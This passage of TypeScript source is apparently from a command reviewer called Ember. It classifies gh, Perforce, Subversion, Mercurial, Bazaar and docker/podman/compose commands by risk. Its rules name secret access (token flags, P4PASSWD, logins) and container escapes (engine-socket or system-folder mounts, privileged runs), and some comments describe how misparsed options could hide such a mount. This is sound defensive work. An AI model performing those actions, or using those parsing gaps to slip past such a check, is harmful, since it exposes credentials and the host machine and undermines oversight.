  const repoOpt = g.opts.find(o => o.name === "-R" || o.name === "--repo")?.value ?? values(parseOpts(rest, { shortValue: "R", longValue: ["repo"] }), "R", "repo")[0];
  const widening = repoOpt ? ["--repo"] : [];
  const objects: Obj[] = repoOpt ? [{ kind: "repo", text: repoOpt, abs: null }] : [];
  if (group === null) { if (h.args[g.verbAt]) h.e.unclear("unclear.gh-verb", "Ember can't tell which gh command this runs."); return; }
  const sub = rest.find(a => !isOption(a))?.v ?? null;
  if (group === "config" && (sub === "set" || sub === "clear-cache")) { h.e.add("system", "pkg.config", "Changes a setting later commands obey, such as where packages come from.", { program: "gh config" }); return; }
  if (group === "auth") {
    if (sub === "status" && !rest.some(a => /^(-t|--show-token)$/.test(a.v ?? ""))) return;
    if (sub === "switch") return;
    h.e.add("secret", "secret.gh-auth", SAYS.secrets, { program: "gh auth" });
    return;
  }
  if (group === "api") {
    const p = parseOpts(rest, { shortValue: "XfFHpqt", longValue: ["method", "field", "raw-field", "header", "input", "jq", "template", "cache", "preview", "hostname"] });
    const method = (values(p, "X", "method")[0] ?? "").toUpperCase();
    const sends = values(p, "f", "F", "field", "raw-field", "input").length > 0;
    for (const v of values(p, "F", "field", "input")) if (v && (v.startsWith("@") || p.opts.some(o => o.name === "--input"))) h.e.usePath(lit(v.replace(/^@/, "").replace(/^[^=]*=@/, "")), "read", h.sc);
    if (method === "DELETE") h.e.add("remote-delete", "gh.api.delete", "Deletes something on GitHub.", { program: "gh api", objects, widening });
    else if (/^(POST|PUT|PATCH)$/.test(method) || (sends && method !== "GET")) h.e.add("publish", "gh.api.write", "Changes something on GitHub.", { program: "gh api", objects, widening });
    return;
  }
  if (group === "browse") { h.e.add("escape", "escape.launcher", SAYS.opensProgram); return; }
  if (group === "extension" || group === "ext" || group === "extensions") {
    if (/^(install|upgrade|remove|create)$/.test(sub ?? "")) h.e.add("system", "pkg.language", "Installs packages (they can run their own setup code).");
    else if (sub === "exec") h.e.unclear("unclear.gh-extension", "Runs code Ember can't see.");
    return;
  }
  if (group === "alias") { if (sub === "set" || sub === "import") h.e.unclear("unclear.alias", "It defines an alias Ember can't follow."); return; }
  if (group === "copilot") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (group === "codespace" && (sub === "ssh" || sub === "code" || sub === "jupyter")) { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (["status", "search", "help", "completion", "version", "config", "attestation", "preview", "agent-task"].includes(group)) return;
  const what = GH_WHAT[group];
  if (!what) { h.e.unclear("unclear.gh-verb", "Ember can't tell which gh command this runs."); return; }
  if (sub === null) return;
  // A release's files or a workflow run's artifacts land in the folder, or in -D's (and -O's file): running one later
  // is running a download (commands-remote-r7-3).
  if ((group === "release" || group === "run") && sub === "download") {
    h.e.download(".", h.sc);
    const dp = parseOpts(rest, { shortValue: "DOnpAR", longValue: ["dir", "output", "name", "pattern", "archive", "repo"] });
    for (const d of values(dp, "D", "dir", "O", "output")) { if (d) h.e.download(d, h.sc); else h.e.markUnnamed(null, h.sc); }
    return;
  }
  if ((group === "repo" || group === "gist") && sub === "clone") {
    const [r, d] = rest.filter(a => !isOption(a)).slice(1);
    if (group === "repo") h.e.download(d?.v ?? r?.v?.split("/").pop() ?? null, h.sc);
    // The folder is named before `--`, which starts git's own options (`gh repo clone a/b -- --depth 1`), else it is the
    // repository's or gist's name; one Ember can't see marks a folder of no name it knows. Added to the mark above, as
    // a later round's marks are (commands-remote-r8-1).
    const dd = rest.findIndex(a => a.v === "--");
    const [r2, d2] = (dd < 0 ? rest : rest.slice(0, dd)).filter(a => !isOption(a)).slice(1);
    const named = d2 ?? r2;
    if (named?.v === null) h.e.markUnnamed(d2 ? null : ".", h.sc);
    else if (named?.v) h.e.download(d2 ? named.v : named.v.replace(/[\\/]+$/, "").split(/[\\/:]/).pop()?.replace(/\.git$/, "") || null, h.sc);
    return;
  }
  if (group === "repo" && sub === "deploy-key" && rest.some(a => a.v === "delete")) { h.e.add("remote-delete", "gh.repo.deploy-key", "Deletes a deploy key on GitHub."); return; }
  if ((GH_DELETE[group] ?? []).includes(sub)) {
    h.e.add("remote-delete", `gh.${group}.delete`, `Deletes ${what} on GitHub.`, { program: `gh ${group} ${sub}`, objects, widening });
    return;
  }
  if ((GH_WRITE[group] ?? []).includes(sub)) {
    // A merge's -m, -r and -s and a review's -a, -c and -r are switches; a release's -n is its notes (commands-remote-i5a).
    const short = sub === "merge" ? "RtbFA" : sub === "review" ? "RbF" : group === "release" ? "RtnF" : group === "gist" ? "Rdf" : "BHRtbFTlamrp";
    // Main's table was one for every verb and knew no --add-label, --notes, --desc, --filename and the like, so the word
    // after one was an option or a file of its own: judged that way too (commands-held-8).
    const p = heldOpts(h, { shortValue: short, longValue: ["base", "head", "repo", "title", "body", "body-file", "label", "assignee", "milestone", "reviewer", "project", "template", "match-head-commit", "subject", "author-email", "add-label", "remove-label", "add-assignee", "remove-assignee", "add-reviewer", "remove-reviewer", "add-project", "remove-project", "notes", "notes-file", "target", "discussion-category", "notes-start-tag", "desc", "filename"] }, { shortValue: "BHRtbFTlamr", longValue: ["base", "head", "repo", "title", "body", "body-file", "label", "assignee", "milestone", "reviewer", "project", "template", "match-head-commit", "subject", "author-email"] }, rest);
    const w = [...widening];
    for (const o of p.opts) if (/^(-B|--base|-H|--head|-R|--repo|--admin|--web|-w|-d|--delete-branch)$/.test(o.name)) w.push(o.name);
    const n = p.operands.slice(1).map(a => ({ kind: "other" as const, text: a.v ?? a.raw, abs: null }));
    for (const f of values(p, "F", "body-file")) if (f && f !== "-") h.e.usePath(lit(f), "read", h.sc);
    const verbWord = sub === "create" || sub === "new" ? (group === "pr" ? "Opens" : "Creates") : sub === "merge" ? "Merges" : "Changes";
    h.e.add("publish", `gh.${group}.${sub === "new" ? "create" : sub}`, `${verbWord} ${what} on GitHub.`, { program: `gh ${group} ${sub}`, objects: [...objects, ...n], widening: w });
    if (group === "pr" && sub === "merge" && has(p, "d", "delete-branch")) h.e.add("remote-delete", "gh.pr.merge.delete-branch", "Deletes the pull request's branch on GitHub.", { program: "gh pr merge", objects: [...objects, ...n], widening: w });
    if (group === "release" && sub === "upload") h.e.readArgs(p.operands.slice(2), h.sc);
    if (group === "gist" && (sub === "create" || sub === "new")) h.e.readArgs(p.operands.slice(1), h.sc);
  }
});

// Perforce, Subversion, Mercurial, Bazaar.
reg(NATIVE, ["p4"], h => {
  const g = globals(h, "p4");
  checkGlobals(h, "p4", g);
  for (const o of g.opts) if (o.name === "-P") h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
  const verb = h.args[g.verbAt]?.v ?? null;
  const rest = h.args.slice(g.verbAt + 1);
  if (verb === null) { if (h.args[g.verbAt]) h.e.unclear("unclear.p4-verb", "Ember can't tell which Perforce command this runs."); return; }
  const p = parseOpts(rest, { shortValue: "cdeftmo", longValue: ["parallel"] });
  const cl = values(p, "c")[0] ?? values(p, "e")[0];
  const clObj: Obj[] = cl ? [{ kind: "changelist", text: cl, abs: null }] : [];
  const files = p.operands.map(a => ({ kind: "path" as const, text: a.v ?? a.raw, abs: null }));
  const opt = p.opts.filter(o => !["-c", "-d", "-e"].includes(o.name)).map(o => o.name);
  switch (verb) {
    case "submit":
      h.e.add("publish", "p4.submit", `Submits ${cl ? `changelist ${cl}` : "the default changelist"} to Perforce.`, { objects: [...clObj, ...files], widening: opt, program: "p4 submit" });
      return;
    case "shelve":
      if (has(p, "d")) { h.e.add("remote-delete", "p4.shelve.delete", "Deletes shelved files in Perforce.", { objects: clObj, program: "p4 shelve" }); return; }
      h.e.add("publish", "p4.shelve", `Shelves ${cl ? `changelist ${cl}` : "the default changelist"} in Perforce.`, { objects: [...clObj, ...files], widening: opt, program: "p4 shelve" });
      return;
    case "unshelve": if (has(p, "f")) h.e.add("publish", "p4.unshelve", "Overwrites files from a shelf in Perforce.", { objects: clObj, program: "p4 unshelve" }); return;
    case "delete": h.e.add("remote-delete", "p4.delete", `Deletes ${listOf(files)} from Perforce.`, { objects: files, program: "p4 delete" }); return;
    case "obliterate": h.e.add("remote-delete", "p4.obliterate", `Deletes ${listOf(files)} and their history from Perforce.`, { objects: files, program: "p4 obliterate" }); return;
    case "revert": {
      const widening = p.operands.some(a => /(^|\/)\.\.\.$/.test(a.v ?? "")) ? ["..."] : [];
      h.e.add("remote-delete", "p4.revert", "Throws away your opened changes in Perforce.", { objects: [...clObj, ...files], widening, program: "p4 revert" });
      return;
    }
    case "change": case "changelist": case "client": case "workspace": case "branch": case "label": case "user": case "group": case "job": case "stream": case "depot": case "remote": case "server":
      if (has(p, "d")) h.e.add("remote-delete", "p4.spec.delete", `Deletes a ${verb} from Perforce.`, { program: `p4 ${verb}` });
      else if (!has(p, "o") && verb !== "change" && verb !== "changelist" && verb !== "client" && verb !== "workspace") h.e.add("publish", "p4.spec", `Changes a ${verb} in Perforce.`, { program: `p4 ${verb}` });
      else if (!has(p, "o")) h.e.unclear("unclear.interactive", SAYS.interactive);
      return;
    case "sync": if (has(p, "f")) h.e.add("destroy", "p4.sync.force", `Overwrites your local copies of ${listOf(files, "your files")}.`, { objects: files, program: "p4 sync" }); return;
    case "resolve": if (has(p, "a") && p.opts.some(o => o.name === "-a") && rest.some(a => /^-a[tf]$/.test(a.v ?? ""))) h.e.add("destroy", "p4.resolve", "Replaces your edits with the depot's."); else if (rest.some(a => /^-a[tf]$/.test(a.v ?? ""))) h.e.add("destroy", "p4.resolve", "Replaces your edits with the depot's."); return;
    case "clean": h.e.add("destroy", "p4.clean", "Deletes and restores local files to match the depot.", { objects: files }); return;
    case "login": case "tickets": case "passwd": case "logout": h.e.add("secret", "secret.p4", SAYS.secrets); return;
    case "set": if (rest.some(a => /^P4PASSWD=/i.test(a.v ?? ""))) h.e.add("secret", "secret.token-arg", SAYS.tokenArg); return;
    case "protect": case "triggers": case "typemap": case "admin": case "configure": case "counter": case "counters": case "property": case "license":
      h.e.add("system", "p4.admin", "Changes how the Perforce server works."); return;
    case "fix": h.e.add("publish", "p4.spec", "Changes a job in Perforce."); return;
    default: return;
  }
});
reg(NATIVE, ["svn"], h => {
  const g = globals(h, "svn");
  checkGlobals(h, "svn", g);
  const verb = h.args[g.verbAt]?.v ?? "";
  const rest = h.args.slice(g.verbAt + 1);
  const ops = rest.filter(a => !isOption(a));
  const urlOp = ops.some(a => URL_LIKE.test(a.v ?? ""));
  // A checkout or export from a URL brings a working copy or files in: a clone, so building or running there asks
  // (commands-remote-r8-2). An explicit destination folder is marked, and the URL's own last name always too, so an
  // option before the path (`svn checkout -r 123 URL`) can't be mistaken for the folder.
  if (/^(checkout|co|export)$/.test(verb) && urlOp) {
    const p = parseOpts(rest, { shortValue: "rxlN", longValue: ["revision", "depth", "set-depth", "targets", "changelist", "encoding", "extensions", "config-dir", "config-option", "username", "password", "with-revprop", "native-eol", "cl"] });
    const purls = p.operands.filter(a => URL_LIKE.test(a.v ?? ""));
    const dest = p.operands.filter(a => !URL_LIKE.test(a.v ?? "")).pop();
    for (const u of purls) if (u.v) h.e.download(u.v.replace(/[\\/]+$/, "").split("/").pop() || null, h.sc);
    if (dest?.v) h.e.markUnnamed(dest.v, h.sc);
    else if (dest && dest.v === null) h.e.markUnnamed(null, h.sc);
  }
  if (/^(commit|ci|import|lock|unlock)$/.test(verb)) h.e.add("publish", "svn.commit", "Sends changes to Subversion.");
  else if (/^(copy|cp|move|mv|rename|ren|mkdir|propset|pset|ps|propdel|pdel|pd|propedit|pedit|pe)$/.test(verb) && urlOp) h.e.add("publish", "svn.commit", "Sends changes to Subversion.");
  else if (/^(delete|del|remove|rm)$/.test(verb)) {
    if (urlOp) h.e.add("remote-delete", "svn.delete", "Deletes files in Subversion.");
    else { const objs = objsOf(h, ops, "deleteTree"); h.e.add("destroy", "svn.delete-local", `Deletes ${listOf(objs)} from the working folder.`, { objects: objs }); }
  } else if (verb === "revert") h.e.add("destroy", "svn.revert", "Throws away local changes.");
  else if (verb === "cleanup" && rest.some(a => /^--remove-(unversioned|ignored)$/.test(a.v ?? ""))) h.e.add("destroy", "svn.cleanup", "Throws away local changes.");
  else if (/^(resolve|resolved)$/.test(verb) && rest.some(a => /theirs-full|--accept=theirs/.test(a.v ?? ""))) h.e.add("destroy", "svn.resolve", "Replaces your edits with the repository's.");
  else if (/^(propedit|pedit|pe)$/.test(verb)) h.e.unclear("unclear.interactive", SAYS.interactive);
});
reg(NATIVE, ["hg"], h => {
  const g = globals(h, "hg");
  checkGlobals(h, "hg", g);
  for (const o of g.opts) if (o.name === "--config" && o.value && /^(hooks|alias|ui\.(editor|merge|ssh)|extensions)/i.test(o.value)) h.e.unclear("unclear.hg-config", "Runs code from a setting.");
  const verb = h.args[g.verbAt]?.v ?? "";
  const rest = h.args.slice(g.verbAt + 1);
  // `hg clone [options] SOURCE [DEST]` brings a working copy in, a clone, so building there asks (commands-remote-r8-2).
  // Options before the path (`hg clone -u tip URL`) take their value, so the source and dest are read past them.
  if (verb === "clone") {
    const p = parseOpts(rest, { shortValue: "urbe", longValue: ["rev", "updaterev", "branch", "ssh", "remotecmd", "config"] });
    const [src, dest] = p.operands;
    if (dest?.v) h.e.markUnnamed(dest.v, h.sc);
    else if (dest && dest.v === null) h.e.markUnnamed(null, h.sc);
    else if (src?.v) h.e.download(src.v.replace(/[\\/]+$/, "").split(/[\\/:]/).pop() || null, h.sc);
    else h.e.markUnnamed(".", h.sc);
  }
  if (verb === "push" || verb === "outgoing" && false) h.e.add("publish", "hg.push", "Sends changes to another repository.");
  else if (/^(strip|purge|clean|rollback|revert|prune|obsolete)$/.test(verb)) h.e.add("destroy", "hg.discard", "Throws away local changes.");
  else if ((verb === "update" || verb === "up" || verb === "checkout" || verb === "co") && rest.some(a => a.v === "-C" || a.v === "--clean")) h.e.add("destroy", "hg.discard", "Throws away local changes.");
  else if (/^(histedit|record|crecord|commit|ci)$/.test(verb) && (verb === "histedit" || verb === "record" || verb === "crecord" || !rest.some(a => /^(-m|--message|-l|--logfile)/.test(a.v ?? "")))) h.e.unclear("unclear.interactive", SAYS.interactive);
});
reg(NATIVE, ["bzr", "brz"], h => { if (/^(push|send|commit|ci)$/.test(h.args[0]?.v ?? "")) h.e.add("publish", "bzr.push", "Sends changes to another repository."); });

// Containers (§3.5.1, §3.5.2, §3.5.5).
reg(NATIVE, ["docker", "podman", "nerdctl", "docker-compose", "podman-compose"], h => {
  const prog = h.key === "docker-compose" ? "docker" : h.key === "podman-compose" ? "podman" : h.key;
  const isCompose = h.key.endsWith("-compose");
  const g = globals(h, prog === "nerdctl" ? "docker" : prog);
  if (!isCompose) checkGlobals(h, prog === "nerdctl" ? "docker" : prog, g);
  for (const o of g.opts) if (o.name === "--config" && o.value) h.e.usePath(lit(o.value), "read", h.sc);
  let verbs = h.args.slice(isCompose ? 0 : g.verbAt);
  if (isCompose) verbs = [lit("compose"), ...h.args];
  let verb = verbs[0]?.v ?? null;
  let rest = verbs.slice(1);
  if (verb === null) { if (verbs[0]) h.e.unclear("unclear.docker-verb", "Ember can't tell which container command this runs."); return; }
  const groups = ["container", "image", "volume", "network", "system", "builder", "buildx", "manifest", "context", "plugin", "secret", "config", "service", "stack", "swarm", "node", "trust", "machine", "pod", "generate", "kube", "artifact", "farm"];
  let group: string | null = null;
  if (groups.includes(verb)) {
    group = verb;
    const sub = rest.find(a => !isOption(a));
    verb = sub?.v ?? null;
    rest = sub ? rest.slice(rest.indexOf(sub) + 1) : [];
  }
  const v = verb ?? "";
  const objsText = rest.filter(a => !isOption(a)).map(a => a.v ?? a.raw);
  const del = (): void => h.e.add("destroy", `${prog}.rm`, "Deletes containers, images or volumes.", { objects: objsText.map(t => ({ kind: "other" as const, text: t, abs: null })) });
  if (verb === "compose" || isCompose) { compose(h, prog, rest); return; }
  if (v === "rm" || v === "rmi" || v === "prune" || v === "remove" || (group === "image" && v === "rm") || (group === "volume" && v === "rm")) { del(); return; }
  if (v === "push" || (group === "buildx" && (v === "build" || v === "bake") && rest.some(a => /^--push$|^--output=.*push=true|^-o$/.test(a.v ?? "")))) {
    const image = objsText[0] ?? "the image";
    h.e.add("publish", `${prog}.push`, `Pushes the image ${image}.`, { objects: [{ kind: "image", text: image, abs: null }], widening: rest.some(a => /^(-a|--all-tags)$/.test(a.v ?? "")) ? ["--all-tags"] : [], program: `${prog} push` });
    return;
  }
  if (v === "build" && rest.some(a => a.v === "--push")) { h.e.add("publish", `${prog}.push`, "Pushes the image it builds.", { program: `${prog} build` }); return; }
  if (v === "login") { h.e.add("secret", "secret.docker-login", SAYS.secrets); return; }
  if (v === "kill" || v === "stop" || v === "restart" || v === "pause") { h.e.add("system", "kill.process", `Stops programs that are running (${joinList(objsText) || "containers"}).`, { objects: objsText.map(t => ({ kind: "process" as const, text: t, abs: null })) }); return; }
  if (v === "run" || v === "create") { containerRun(h, prog, rest); return; }
  if (v === "exec") {
    // -d (detach) takes no value (commands-remote-c4-2).
    // Main's table gave -d the next word, so the container was the word after it and the command began one word later:
    // judged that way too (commands-held-9).
    const p = heldOpts(h, { shortValue: "euw", longValue: ["env", "user", "workdir", "detach-keys", "env-file"], stopAtOperand: true }, { shortValue: "euwd", longValue: ["env", "user", "workdir", "detach-keys", "env-file"], stopAtOperand: true }, rest);
    if (has(p, "i") && has(p, "t")) h.e.unclear("unclear.interactive", SAYS.interactive);
    if (has(p, "d", "detach")) h.e.add("escape", "escape.background", SAYS.keepsRunning);
    h.e.payload(p.operands.slice(1), h.sc, `${prog} exec`);
    return;
  }
  if (v === "cp") {
    const ops = rest.filter(a => !isOption(a));
    const [src, dst] = ops;
    const remote = (a: Arg | undefined): boolean => !!a?.v && /^[A-Za-z0-9_.-]+:/.test(a.v) && !/^[A-Za-z]:[\\/]/.test(a.v);
    if (src && !remote(src)) h.e.usePath(src, "readTree", h.sc);
    if (dst && !remote(dst)) { const obj = h.e.usePath(dst, "write", h.sc); if (obj.abs) h.e.add("destroy", "posix.cp", `Replaces ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); }
    // A file copied out of a container is a download where it lands (commands-remote-r7-3).
    if (dst && !remote(dst) && src && (remote(src) || src.v === null)) { if (dst.v) h.e.download(dst.v, h.sc); else h.e.markUnnamed(null, h.sc); }
    return;
  }
  if (v === "save" || v === "export") { for (const o of values(parseOpts(rest, { shortValue: "o", longValue: ["output"] }), "o", "output")) if (o) { const obj = h.e.usePath(lit(o), "write", h.sc); if (obj.abs) h.e.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs }); } return; }
  if (v === "attach") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (group === "context" && /^(use|create|update|rm|remove|import)$/.test(v)) { h.e.add("system", "docker.context", "Changes which computer container commands go to."); return; }
  if (group && /^(secret|config|service|stack|swarm|node|trust|plugin|machine)$/.test(group)) {
    if (/^(ls|list|inspect|ps|logs|view)$/.test(v)) return;
    if (/^(rm|remove|leave|disable)$/.test(v)) { h.e.add("remote-delete", "docker.cluster.delete", `Deletes something in ${prog}'s cluster.`); return; }
    if (group === "plugin" && /^(install|upgrade|enable|create)$/.test(v)) { h.e.add("system", "pkg.system", "Installs, removes or upgrades software."); return; }
    h.e.add("publish", "docker.cluster", `Changes ${prog}'s cluster.`);
    return;
  }
  if (group === "network" && /^(create|connect|disconnect)$/.test(v)) return;
  if (["ps", "images", "inspect", "logs", "top", "stats", "version", "info", "history", "search", "events", "port", "diff", "wait", "pull", "build", "tag", "load", "import", "commit", "start", "unpause", "rename", "update", "ls", "df", "use", "show", "help", "--help", "scan", "sbom", "init", "debug", "volumes", "bake"].includes(v)) {
    if (v === "start" && rest.some(a => /^-[a-z]*i/.test(a.v ?? "") || a.v === "--interactive")) h.e.unclear("unclear.interactive", SAYS.interactive);
    return;
  }
  h.e.unclear("unclear.docker-verb", "Ember can't tell which container command this runs.");
});
/**
 * docker's and podman's run and create options that take a value (`docker run --help`, podman-run(1)): one missing here
 * would make its value the image, and the options after it (a mount, --privileged) would go unseen (commands-remote-c4-2).
 */
const CONTAINER_RUN_VALUE: readonly string[] = [
  "env", "user", "publish", "volume", "workdir", "label", "cpu-shares", "hostname", "memory", "attach", "name", "network", "net", "mount", "entrypoint",
  "env-file", "device", "cap-add", "cap-drop", "pid", "ipc", "userns", "security-opt", "platform", "restart", "runtime", "add-host", "dns", "log-driver",
  "log-opt", "ulimit", "tmpfs", "gpus", "pull", "cidfile", "cgroupns", "uts", "volumes-from", "group-add", "health-cmd", "stop-signal", "storage-opt",
  "sysctl", "isolation", "init-path", "shm-size", "annotation", "blkio-weight", "blkio-weight-device", "cgroup-parent", "cpu-count", "cpu-percent",
  "cpu-period", "cpu-quota", "cpu-rt-period", "cpu-rt-runtime", "cpus", "cpuset-cpus", "cpuset-mems", "detach-keys", "device-cgroup-rule",
  "device-read-bps", "device-read-iops", "device-write-bps", "device-write-iops", "dns-option", "dns-opt", "dns-search", "domainname", "expose",
  "health-interval", "health-retries", "health-start-interval", "health-start-period", "health-timeout", "io-maxbandwidth", "io-maxiops", "ip", "ip6",
  "kernel-memory", "label-file", "link", "link-local-ip", "mac-address", "memory-reservation", "memory-swap", "memory-swappiness", "network-alias",
  "net-alias", "oom-score-adj", "pids-limit", "stop-timeout", "umask", "volume-driver",
  // podman's own.
  "arch", "authfile", "cgroup-conf", "cgroups", "chrootdirs", "conmon-pidfile", "decryption-key", "env-merge", "gidmap", "group-entry",
  "health-log-destination", "health-max-log-count", "health-max-log-size", "health-on-failure", "health-startup-cmd", "health-startup-interval",
  "health-startup-retries", "health-startup-success", "health-startup-timeout", "hostuser", "image-volume", "os", "passwd-entry", "personality",
  "pidfile", "pod", "pod-id-file", "preserve-fd", "preserve-fds", "rdt-class", "requires", "retry", "retry-delay", "sdnotify", "seccomp-policy", "secret",
  "shm-size-systemd", "subgidname", "subuidname", "systemd", "timeout", "tz", "uidmap", "unsetenv", "variant",
];
function containerRun(h: H, prog: string, rest: Arg[]): void {
  // -P (--publish-all), -d, -i, -t and -q take no value (commands-remote-c4-2).
  // Main's table gave -P the next word and knew fewer value options, so the image was another word: judged that way too
  // (commands-held-8).
  const p = heldOpts(h, { shortValue: "eupvwlchma", stopAtOperand: true, longValue: CONTAINER_RUN_VALUE }, { shortValue: "eupvwlchmaP", stopAtOperand: true, longValue: ["env", "user", "publish", "volume", "workdir", "label", "cpu-shares", "hostname", "memory", "attach", "name", "network", "net", "mount", "entrypoint", "env-file", "device", "cap-add", "cap-drop", "pid", "ipc", "userns", "security-opt", "platform", "restart", "runtime", "add-host", "dns", "log-driver", "log-opt", "ulimit", "tmpfs", "gpus", "pull", "cidfile", "cgroupns", "uts", "volumes-from", "group-add", "health-cmd", "stop-signal", "storage-opt", "sysctl", "isolation", "init-path", "shm-size"] }, rest);
  // Without an image it can't run as it is: asked about rather than judged as nothing (commands-remote-i5a).
  if (p.operands.length === 0 && !has(p, "help") && !h.e.readsAsMain) h.e.unclear("unclear.docker-verb", "Ember can't tell which container command this runs.");
  if (has(p, "d", "detach")) h.e.add("escape", "escape.background", SAYS.keepsRunning);
  if (has(p, "i", "interactive") && has(p, "t", "tty")) h.e.unclear("unclear.interactive", SAYS.interactive);
  const priv = has(p, "privileged")
    || values(p, "pid", "ipc", "userns", "uts", "cgroupns").includes("host") || values(p, "net", "network").includes("host")
    || values(p, "cap-add", "device").length > 0 || values(p, "security-opt").some(s => /unconfined|disable/.test(s ?? ""));
  containerMounts(h, p);
  if (priv) h.e.add("system", "docker.privileged", "Gives a container access to the whole computer.");
  for (const f of values(p, "env-file")) if (f) h.e.usePath(lit(f), "read", h.sc);
  void prog;
}
/** A container engine's socket or named pipe: whoever reaches it can start a container that mounts the whole computer. */
const ENGINE_SOCKET = /\.sock$|^[\\/]{2}[.?][\\/]pipe[\\/]/i;
/** Folders that hold an engine's socket (`/run`, `/run/user/1000`, `/var/run/docker`). */
const ENGINE_DIR = /^\/(var\/)?run(\/(docker|podman|containerd|crio|buildkit|user(\/\d+(\/(docker|podman|containerd))?)?))?$/;
/** System folders as a whole, read-only or not. */
const SYSTEM_MOUNT = /^\/(usr|boot|sys|proc|dev|bin|sbin|lib[^/]*|etc|var|opt)$/;
/**
 * A container's bind mounts (-v/--volume host:container[:options], --mount type=bind,src=…): the host path is read as a
 * whole and, unless read-only, written; a mount of an engine's socket or a system folder gives the container the
 * computer, and a writable one outside the task's folder lets the container change or delete what is there (review
 * #170). Named volumes and anonymous ones (`data:/x`, `-v /x`) are the engine's own, not the computer's files.
 */
function containerMounts(h: H, p: Parsed): void {
  const mounts: { src: string; ro: boolean }[] = [];
  for (const vol of values(p, "v", "volume")) {
    if (vol === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell which folder the container is given."); continue; }
    // host:container[:options]; a Windows host path keeps its drive's colon. `-v=x` is `-v x`.
    const v = vol.replace(/^=/, "");
    const at = v.indexOf(":", /^[A-Za-z]:[\\/]/.test(v) ? 2 : 0);
    if (at < 0) { if (v === "/") mounts.push({ src: v, ro: false }); continue; }
    const dst = v.slice(at + 1);
    const end = dst.indexOf(":", /^[A-Za-z]:[\\/]/.test(dst) ? 2 : 0);
    // Podman's `O` is an overlay: the container's changes are thrown away.
    mounts.push({ src: v.slice(0, at), ro: end >= 0 && dst.slice(end + 1).split(",").some(o => /^(ro|readonly|O)$/.test(o)) });
  }
  for (const m of values(p, "mount")) {
    if (m === null) { h.e.unclear("unclear.unresolved-arg", "Ember can't tell which folder the container is given."); continue; }
    const kv = new Map(m.split(",").map(s => {
      const i = s.indexOf("=");
      return [(i < 0 ? s : s.slice(0, i)).trim().toLowerCase(), i < 0 ? "true" : s.slice(i + 1)] as const;
    }));
    const src = kv.get("source") ?? kv.get("src");
    if (src === undefined || kv.get("type") === "tmpfs") continue;
    mounts.push({ src, ro: ["readonly", "ro"].some(k => kv.has(k) && !/^(false|0)$/i.test(kv.get(k) ?? "")) });
  }
  for (const { src, ro } of mounts) {
    if (src === "/" || /^[A-Za-z]:\\?$/.test(src)) { h.e.add("system", "docker.privileged", "Gives a container access to the whole computer."); continue; }
    // A name without a slash is a named volume (`data`); anything else is a folder or file on the computer.
    if (/^[A-Za-z0-9][A-Za-z0-9_.-]*$/.test(src)) continue;
    const mark = h.e.written.length;
    const obj = h.e.usePath(lit(src), "readTree", h.sc);
    if (!ro) h.e.usePath(lit(src), "write", h.sc);
    // Only §3.6's rules: what the container writes there is a write Ember doesn't follow for a script run later (L8).
    h.e.written.length = mark;
    const forms = [src.startsWith("/") ? posix.normalize(src).replace(/(.)\/$/, "$1") : null, h.sc.path.flavour === "posix" ? obj.abs : null];
    if (ENGINE_SOCKET.test(src) || forms.some(f => f !== null && (ENGINE_DIR.test(f) || SYSTEM_MOUNT.test(f) || (!ro && /^\/(sys|proc)\//.test(f))))) {
      h.e.add("system", "docker.privileged", "Gives a container access to the whole computer.");
    } else if (!ro && (obj.abs === null || !inWorkTree(obj.abs, h.sc.path))) {
      h.e.add("destroy", "docker.mount", `Lets a container change or delete files in ${obj.text}.`, { objects: [obj] });
    }
  }
}
function compose(h: H, prog: string, rest: Arg[]): void {
  const p = parseOpts(rest, { shortValue: "fp", longValue: ["file", "project-name", "project-directory", "env-file", "profile", "context", "ansi", "progress"] });
  for (const f of values(p, "f", "file", "env-file")) if (f) h.e.usePath(lit(f), "read", h.sc);
  const sub = p.operands[0]?.v ?? "";
  const subRest = p.operands.slice(1);
  const flags = rest.map(a => a.v ?? "");
  if (sub === "up" || sub === "start" || sub === "run" || sub === "create") {
    if (flags.some(f => f === "-d" || f === "--detach" || /^-[a-z]*d[a-z]*$/.test(f))) h.e.add("escape", "escape.background", SAYS.keepsRunning);
    if (sub === "run" && !flags.includes("-T") && !flags.some(f => f === "-d" || f === "--detach")) h.e.unclear("unclear.interactive", SAYS.interactive);
    // `compose run -v host:container` mounts as `docker run -v` does.
    const at = rest.indexOf(p.operands[0]);
    // Main's table knew no --pull, so the word after it was the service and the mounts behind it were unread: judged that
    // way too (commands-held-8).
    if (sub === "run") containerMounts(h, heldOpts(h, { shortValue: "eluvwp", longValue: ["env", "env-from-file", "label", "user", "volume", "workdir", "publish", "name", "entrypoint", "cap-add", "cap-drop", "pull"], stopAtOperand: true }, { shortValue: "eluvwp", longValue: ["env", "env-from-file", "label", "user", "volume", "workdir", "publish", "name", "entrypoint", "cap-add", "cap-drop"], stopAtOperand: true }, rest.slice(at + 1)));
    return;
  }
  if (sub === "down" || sub === "rm" || sub === "kill") { h.e.add("destroy", `${prog}.rm`, "Deletes containers, images or volumes."); return; }
  if (sub === "stop" || sub === "restart" || sub === "pause") { h.e.add("system", "kill.process", "Stops programs that are running (containers)."); return; }
  if (sub === "push") { h.e.add("publish", `${prog}.push`, "Pushes the images it builds.", { program: `${prog} compose push` }); return; }
  if (sub === "exec") { h.e.payload(subRest.slice(1), h.sc, `${prog} compose exec`); return; }
  if (["ps", "logs", "config", "build", "pull", "images", "top", "ls", "version", "port", "events", "convert", "ls", "wait", "watch", "stats", "cp", "attach", "scale", "unpause", "alpha", "help"].includes(sub)) return;
  h.e.unclear("unclear.docker-verb", "Ember can't tell which container command this runs.");
}

// Cloud and cluster command-line tools (§3.5.2, §3.5.3, §3.5.4).
/** Verbs the cloud CLIs use for changes (a resource name after them isn't the verb). */
